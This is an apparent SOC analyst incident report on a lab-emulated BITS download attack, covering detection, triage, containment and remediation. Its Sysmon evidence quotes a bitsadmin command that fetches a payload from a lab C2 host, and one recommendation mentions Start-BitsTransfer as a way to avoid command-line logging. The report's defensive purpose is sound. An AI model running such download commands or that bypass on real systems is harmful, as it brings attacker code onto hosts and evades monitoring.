# INC-2026-001 — LOLBin Execution: BITS Download (Case #3)

| Field | Value |
|-------|-------|
| **Incident ID** | INC-2026-001 |
| **Focus Area** | **Endpoint Auditing / LOLBins** |
| **osTicket** | #48291 |
| **Severity** | P2 — High |
| **Status** | Closed — True Positive (Lab Emulation) |
| **Detection Source** | Wazuh Host IDS Rule 180001 + Suricata NIDS + Microsoft Defender for Endpoint (EDR) |
| **Caldera Operation** | `2026-06-13-INC001-BITS-LAB` |
| **MITRE ATT&CK** | T1197 (BITS Jobs), T1105 (Ingress Tool Transfer), T1059.003 (Windows Command Shell) |
| **Analyst** | Praisel Ekpenyong |
| **Lab Environment** | Hybrid — Lab 1 (Wazuh/Sysmon/Suricata) + Lab 2 (Defender/Sentinel) |

---

## Executive Summary

The Wazuh Host Intrusion Detection System (HIDS), Suricata NIDS, and Defender EDR flagged `bitsadmin.exe` downloading a payload to WKSTN-042 under a standard user context. I validated the alert by comparing parent process, destination, user context, and change records against a benign SCCM baseline. The case was contained to one host, escalated to Tier 2, cleaned, and closed as a Caldera-validated true positive.

### MITRE Evidence Map

| Technique | Evidence |
|-----------|----------|
| T1197 BITS Jobs | `bitsadmin /transfer` command in Sysmon EID 1 |
| T1105 Ingress Tool Transfer | Payload written to `C:\Users\Public\payload.exe` |
| T1059.003 Windows Command Shell | `cmd.exe` parent process launched the BITS transfer |

---

## 1. Detection

**2026-06-13 14:22:08 UTC** — Wazuh alert on `WKSTN-042`:

```
Rule: 180001 (level 8) — Suspicious download and execution with BITS job
Agent: wazuh-agent-wkstn-042
MITRE: T1197
```

**14:22:15 UTC** — Suricata NIDS alert on pfSense (syslog-forwarded to Splunk):

```
[1:2018244:2] ET POLICY User-Agent (Microsoft BITS) Direct EXE/DLL Download over HTTP
Source: 10.10.10.42:49811 -> Destination: 10.10.30.10:8888
Classification: Potential Corporate Privacy Violation (Executable download via BITS)
```

**14:22:41 UTC** — Microsoft Defender alert: *Suspicious process chain: cmd.exe → bitsadmin.exe*

Praisel Ekpenyong (SOC Analyst L1) acknowledged osTicket #48291 within 8 minutes.

---

## 2. Validation

| Check | Result |
|-------|--------|
| Change window / approved script? | No matching change ticket |
| Parent process | `cmd.exe` spawned by unusual parent (non-SCCM) |
| Command line contains `/transfer` and remote URL | Yes — matches BITS download pattern |
| User context | `CORP\jsmith` (standard user, not IT admin) |
| Caldera correlation | Operation `2026-06-13-INC001-BITS-LAB` ability `Download file using BITSAdmin` finished 14:22:06 UTC |

**Determination:** True positive — unauthorized download and execution chain.

### Malicious vs benign comparison

| Attribute | **Suspicious (this case)** | **Benign baseline (WKSTN-099)** |
|-----------|---------------------------|--------------------------------|
| Binary | `bitsadmin.exe` LOLBin | `bitsadmin.exe` (same binary) |
| Parent | `cmd.exe` from user session | `CcmExec.exe` (SCCM) |
| Command line | `/transfer` to `10.10.30.10:8888` | `/transfer` to `cdn.microsoft.com` |
| Change ticket | None | CHG-8810 patch window |
| User | Standard user `jsmith` | SYSTEM deployment context |
| **Verdict** | **Malicious** | **Expected admin activity — close** |

Tier 1 does not treat every `bitsadmin` or PowerShell alert as malware. This case is suspicious because of **parent, destination, user context, and missing change record**.

---

## 3. Enrichment

### Asset

| Attribute | Value |
|-----------|-------|
| Hostname | WKSTN-042 |
| IP | 10.10.10.42 |
| OS | Windows 10 22H2 |
| Criticality | Medium (finance analyst workstation) |
| EDR status | Online |

### IOC Enrichment

| IOC | Type | Enrichment Result |
|-----|------|-------------------|
| `10.10.30.10:8888` | URL (Caldera C2 lab) | Internal lab host — tagged `caldera-c2-lab` |
| `C:\Users\Public\payload.exe` | File path | Sysmon SHA256: `a3f2b8c1d4e5f678901234567890abcd1234567890abcdef1234567890abcd12` (lab sample) |
| `bitsadmin.exe` | Process | Legitimate binary, abused (LOLBIN) |

```powershell
# Enrichment performed
Get-FileHash "C:\Users\Public\payload.exe" -Algorithm SHA256
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 20
```

### Related Alerts (Last 24 hr)

- None on other hosts for same URL (isolated to WKSTN-042)

---

## 4. Containment

| Time (UTC) | Action | Performed By |
|------------|--------|--------------|
| 14:35:00 | Isolated WKSTN-042 via Defender for Endpoint | Praisel Ekpenyong |
| 14:36:00 | Disabled network route to 10.10.30.10:8888 at pfSense (temporary) | Tier 1 |
| 14:40:00 | Reset password for `CORP\jsmith` (precaution) | Tier 1 via helpdesk workflow |

---

## 5. Eradication

| Time (UTC) | Action |
|------------|--------|
| 14:55:00 | Quarantined `payload.exe` via MDE |
| 14:58:00 | Killed residual `sandcat` Caldera agent process |
| 15:05:00 | Removed BITS job: `bitsadmin /list /verbose` → delete orphaned job |
| 15:10:00 | Caldera operation stopped; cleanup abilities confirmed |

---

## 6. Recovery

| Time (UTC) | Action |
|------------|--------|
| 15:30:00 | Full AV scan — clean |
| 15:45:00 | Removed host isolation after T2 review |
| 16:00:00 | User briefed; workstation returned to service |

---

## 7. Escalation

**Escalated to Tier 2 at 14:45 UTC** — Reason: confirmed unauthorized code execution on finance VLAN workstation. T2 validated scope (single host), approved recovery.

**Not escalated to IR team** — No domain admin involvement, no lateral movement observed.

---

## 8. Timeline (UTC)

| Time | Event |
|------|-------|
| 14:20:00 | Caldera operation started (T1-Windows-Download-Exec) |
| 14:22:05 | Sysmon EID 1 — `bitsadmin.exe /transfer` |
| 14:22:06 | BITS download ability completed |
| 14:22:08 | Wazuh alert 180001 fired |
| 14:22:15 | Suricata NIDS alert fired |
| 14:22:41 | Defender alert correlated |
| 14:30:00 | Tier 1 began investigation |
| 14:35:00 | Host isolated |
| 14:45:00 | Escalated to T2 |
| 15:10:00 | Eradication complete |
| 16:00:00 | Closed |

---

## 9. Evidence

### Sysmon Excerpt (Event ID 1)

```
Image: C:\Windows\System32\bitsadmin.exe
CommandLine: bitsadmin /transfer debjob /download /priority foreground http://10.10.30.10:8888/file/download C:\Users\Public\payload.exe
ParentImage: C:\Windows\System32\cmd.exe
User: CORP\jsmith
```

### Splunk Query Used

```spl
index=sysmon EventCode=1 host=WKSTN-042
| search CommandLine="*bitsadmin*" OR CommandLine="*transfer*"
| table _time User Image CommandLine ParentImage
```

### Sentinel KQL Used

```kql
DeviceProcessEvents
| where DeviceName == "WKSTN-042"
| where Timestamp between (datetime(2026-06-13 14:15:00) .. datetime(2026-06-13 14:30:00))
| where ProcessCommandLine has "bitsadmin"
| project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

---

## 10. Recommendations

1. **Detection** — Add parent-process filter: alert when `bitsadmin` parent is not `svchost.exe` or approved patch tool.
2. **Hardening** — Consider AppLocker rule to restrict `bitsadmin.exe` for standard users.
3. **Monitoring** — Enable PowerShell script block logging on finance VLAN.
4. **Training** — Phishing follow-up for user `jsmith` (linked scenario in `phishing/`).
5. **Lab** — Retain Caldera op ID in detection regression suite quarterly.
6. **T2 Pivot Note (PowerShell BITS Bypass):** Attackers can bypass `bitsadmin.exe` command-line logging by invoking BITS transfers natively through PowerShell via the `Start-BitsTransfer` cmdlet. Detection rules must also monitor Sysmon Event ID 1 for PowerShell loaded with the BITS utility assembly (`Microsoft.PowerShell.Commands.Utility`) or Event ID 22 (DNS queries) initiated by PowerShell to suspicious external hosting IPs.

---

## 11. Evidence & Artifacts

### Raw Log Files & Artifacts

| Source | File Path |
|---|---|
| Sysmon Event Log Export | [`artifacts/logs/sysmon-INC001.json`](../artifacts/logs/sysmon-INC001.json) |
| Wazuh Alert Log Export | [`artifacts/logs/wazuh-alert-INC001.json`](../artifacts/logs/wazuh-alert-INC001.json) |
| Caldera Operation JSON | [`artifacts/caldera-operation-INC001.json`](../artifacts/caldera-operation-INC001.json) |

### Evidence Screenshots

Screenshots are supplemental walkthrough visuals. The Sysmon excerpt, SPL/KQL, Wazuh rule, and Defender/Sentinel event data are the primary evidence for this case.

| Tool | Capture |
|------|---------|
| Wazuh | `artifacts/screenshots/wazuh-inc001.png` |
| Microsoft Defender | `artifacts/screenshots/defender-inc001.png` |
| Microsoft Sentinel | `artifacts/screenshots/sentinel-inc001.png` |
| osTicket | `artifacts/screenshots/osticket-48291.png` |
| Sysmon (Event Viewer) | `artifacts/screenshots/sysmon-inc001.png` |
| IOC enrichment | `artifacts/screenshots/ioc-enrichment.png` |

---

## 12. Analyst Notes

This incident was triggered by a **live** Caldera operation (`2026-06-13-INC001-BITS-LAB`) to validate Wazuh rule 180001 and Defender correlation. Exported artifacts and alert times are recorded in [`docs/live-evidence-ledger.md`](../docs/live-evidence-ledger.md). Production analysts would follow identical triage steps; the Caldera operation ID in the header is a lab provenance marker only.
